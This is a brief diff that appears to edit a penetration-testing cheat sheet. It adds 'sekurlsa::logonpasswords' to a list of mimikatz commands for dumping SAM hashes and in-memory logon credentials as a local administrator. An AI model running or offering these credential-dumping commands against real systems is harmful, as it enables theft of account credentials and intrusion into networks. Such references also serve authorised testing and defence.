@@ -229,6 +229,7 @@ mimikatz dump as local admin:
 privilege::debug
 token::elevate
 lsadump::sam
+sekurlsa::logonpasswords
 ```
 
 mimikatz as domain admin:
